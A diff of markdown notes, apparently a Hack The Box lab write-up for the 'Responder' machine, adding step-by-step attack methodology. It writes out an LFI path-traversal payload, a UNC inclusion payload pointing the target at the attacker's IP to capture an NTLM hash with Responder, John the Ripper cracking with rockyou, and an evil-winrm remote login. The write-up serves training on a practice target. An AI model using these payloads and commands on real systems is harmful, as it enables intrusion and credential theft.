@@ -447,13 +447,36 @@ What Nmap scanning switch employs the use of default scripts during a scan? _-sC
 
  
 ### Methodology
-1. Perform nmap scan --> _nmap -sV -T5 TargetIP_ --> **Port 80 open, http service detected**
+1. Perform nmap scan --> `_nmap -sV -T5 TargetIP_` --> **Port 80 open, http service detected**
 - I noticed OpenSSL and PHP service and version discovered with nmap scan
 2. Attempt to access web service using IP address, arrive to "unika.htb", but not able to connect
 3. Add "unika.htb" to `etc/hosts/` file
 4. Access web page --> PHP scripting language discovered using "Wappalyzer" broswer extension.
 5. Navigate web page, clicking different buttons and links, once I clicked on changing the web page language then URL parameters revealed that "page=" was being used to load in different languages.
-6. Attempting to perform LFI on "page=" parameter with this payload "../../../../../../../../windows/system32/drivers/etc/hosts" --> successful!  
+6. Attempting to perform LFI on "page=" parameter with this payload "../../../../../../../../windows/system32/drivers/etc/hosts" --> successful!
+7. Attempt to steal password hash from NTLM authentication of SMB using responder
+8. Responder command --> `_responder -I tun0_`
+9. Set parameter in URL to Remote File Inclution payload so the target would attemt to connect to our machine.
+10. Payload --> `_//10.10.14.16/somefile_` --> make sure IP is your machine
+11. Once hash is recieved from responder, copy it to .txt file then send it to John The Ripper for cracking
+12. `echo "hash" > hash.txt` (copy hash from reponder to txt file)
+12. JTR command --> `_john -w=/usr/share/wordlists/rockyou.txt hash.txt`
+13. Password hash cracked!
+14. Login to Microsoft HTTPAPI httpd 2.0 on port 5985, which is the Windows Remote Management (WinRM) service
+15. Use `evil-winrm` to login to the WinRM service. Use cracked password and username from responder
+16. `_evil-winrm -i TargetIP -u username -p password_` --> success!
+17. Navigate the windows machine using powershell. Initial directory --> `*Evil-WinRM* PS C:\Users\Administrator>`
+18. `ls` = list, `cd` = change directories, `type` = show content of a file
+19. Flag Captured!
+20. Machine Pwned.
+
+#### Post Notes
+- I got stuck a couple times in this machine, looked up alot of things especially with responder, I got stuck on it for a second, just needed to use the right IP for the RFI payload. John the ripper was easy to use, I just had to extract the "rockyou.txt" file as it wasnt unzipped initially. "Lastly, jsut looked up a couple of powershell commands to navigate and capture the flag. Other than that, not too bad.
+
+* * *
+
+## 13. Three
+
 
 
 
@@ -461,7 +484,6 @@ What Nmap scanning switch employs the use of default scripts during a scan? _-sC
 
 * * *
 
-## 13. Three
 ## 14. Ignition
 ## 15. Bike
 ## 16. Funnel
